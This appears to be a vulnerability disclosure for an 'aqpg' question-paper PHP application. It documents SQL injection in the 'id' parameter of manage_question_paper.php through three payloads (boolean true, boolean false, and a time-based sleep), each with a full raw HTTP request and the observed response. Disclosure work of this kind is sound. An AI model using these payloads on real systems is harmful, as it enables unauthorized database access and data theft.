BUG_Author:0019FF

Vulnerability File: /aqpg/users/question_papers/manage_question_paper.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=1' and 999=999 and 'o'='o

```
GET /aqpg/users/question_papers/manage_question_paper.php?id=1%27%20and%20999=999%20and%20%27o%27=%27o HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=gqm4opdrfvm9njhrtmcivvn20b
Connection: close
```

The sql statement is executed correctly

![image](https://github.com/19FF/bug_report/blob/main/sql1.png)

Payload2:id=1' and 999=996 and 'o'='p

```
GET /aqpg/users/question_papers/manage_question_paper.php?id=1%27%20and%20999=996%20and%20%27o%27=%27p HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=gqm4opdrfvm9njhrtmcivvn20b
Connection: close
```

The sql statement was executed incorrectly, causing the page not to be echoed normally

![image](https://github.com/19FF/bug_report/blob/main/sql2.png)

Payload3:id=1' and (select 9 from (select(sleep(15)))b) and 't'='t

```
GET /aqpg/users/question_papers/manage_question_paper.php?id=1%27%20and%20(select%209%20from%20(select(sleep(15)))b)%20and%20%27t%27=%27t HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=gqm4opdrfvm9njhrtmcivvn20b
Connection: close
```

The server response time is 15 seconds

![image](https://github.com/19FF/bug_report/blob/main/sql3.png)
